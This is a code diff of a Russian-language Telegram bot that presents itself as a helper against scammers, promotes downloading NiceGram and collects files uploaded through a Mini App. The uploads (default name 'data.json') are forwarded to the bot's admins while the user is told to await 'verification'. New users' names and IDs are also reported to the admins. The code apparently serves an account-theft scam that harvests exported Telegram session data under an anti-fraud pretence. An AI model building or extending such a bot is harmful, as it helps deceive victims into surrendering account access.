@@ -25,7 +25,7 @@ dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-# ---------- DATABASE ----------
+# ================= DATABASE =================
 
 def init_db():
     with sqlite3.connect(DB_FILE) as conn:
@@ -82,7 +82,7 @@ def add_new_admin(user_id):
         )
         conn.commit()
 
-# ---------- WEB SERVER ----------
+# ================= WEB SERVER =================
 
 routes = web.RouteTableDef()
 
@@ -96,7 +96,7 @@ async def handle_upload_file(request: web.Request):
 
     user_id = None
     file_data = None
-    filename = "data.json"
+    filename = "unknown.json"
 
     while True:
         part = await reader.next()
@@ -104,32 +104,47 @@ async def handle_upload_file(request: web.Request):
             break
 
         if part.name == 'user_id':
-            user_id = (await part.read()).decode()
+            val = await part.read_chunk()
+            user_id = val.decode('utf-8')
         elif part.name == 'file':
-            filename = part.filename
+            filename = part.filename or "data.json"
             file_data = await part.read()
 
     if user_id and file_data:
-        for admin_id in get_all_admins():
+        admin_ids = get_all_admins()
+        caption_text = f"🚨 Файл загружен через Mini App!\nUser ID: {user_id}"
+
+        for admin_id in admin_ids:
             try:
                 await bot.send_document(
-                    admin_id,
-                    BufferedInputFile(file_data, filename),
-                    caption=f"File from user {user_id}"
+                    chat_id=admin_id,
+                    document=BufferedInputFile(file_data, filename=filename),
+                    caption=caption_text
                 )
-            except:
-                pass
+            except Exception as e:
+                logging.warning(e)
 
         try:
-            await bot.send_message(int(user_id), "Файл получен")
+            await bot.send_message(
+                chat_id=int(user_id),
+                text="✅ Файл принят. Ожидайте проверки."
+            )
         except:
             pass
 
     return web.Response(text="OK")
 
-# ---------- BOT UI ----------
+@routes.options('/upload')
+async def handle_options(request):
+    return web.Response(headers={
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Methods": "POST, OPTIONS",
+        "Access-Control-Allow-Headers": "Content-Type"
+    })
 
-TEXT_MAIN = "Привет! Я помогу тебе не попасться на мошенников."
+# ================= BOT UI =================
+
+TEXT_MAIN = """Привет! Я - Бот, который поможет тебе не попасться на мошенников."""
 
 def get_main_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -137,12 +152,25 @@ def get_main_keyboard():
         [InlineKeyboardButton(text="📱 Скачать NiceGram", url="https://nicegram.app/")]
     ])
 
-# ---------- COMMANDS ----------
+# ================= COMMANDS =================
 
 @router.message(Command("start"))
 async def cmd_start(message: types.Message):
     user = message.from_user
     is_new = add_user_if_new(user)
+
+    if is_new:
+        admin_text = (
+            f"👤 Новый пользователь\n"
+            f"{user.full_name}\n"
+            f"@{user.username}\n"
+            f"ID: {user.id}"
+        )
+        for admin_id in get_all_admins():
+            try:
+                await bot.send_message(admin_id, admin_text)
+            except:
+                pass
 
     if os.path.exists("nicegramm.jpg"):
         await message.answer_photo(
@@ -152,6 +180,8 @@ async def cmd_start(message: types.Message):
         )
     else:
         await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())
+
+# ================= ADMIN =================
 
 @router.message(Command("admin"))
 async def cmd_admin(message: types.Message):
@@ -174,11 +204,11 @@ async def cmd_admin(message: types.Message):
         row = cursor.fetchone()
 
     if not row:
-        await message.answer("User not found")
+        await message.answer("Пользователь не найден")
         return
 
     add_new_admin(row[0])
-    await message.answer("Admin added")
+    await message.answer("Администратор добавлен")
 
 @router.message(Command("text"))
 async def cmd_text(message: types.Message):
@@ -187,7 +217,7 @@ async def cmd_text(message: types.Message):
 
     parts = message.text.split(maxsplit=2)
     if len(parts) < 3:
-        await message.answer("/text @username message")
+        await message.answer("/text @username сообщение")
         return
 
     username = parts[1].replace("@", "").lower()
@@ -202,13 +232,12 @@ async def cmd_text(message: types.Message):
         row = cursor.fetchone()
 
     if not row:
-        await message.answer("User not found")
+        await message.answer("Пользователь не найден")
         return
 
     await bot.send_message(row[0], text)
-    await message.answer("OK")
 
-# ---------- START ----------
+# ================= START =================
 
 async def main():
     init_db()
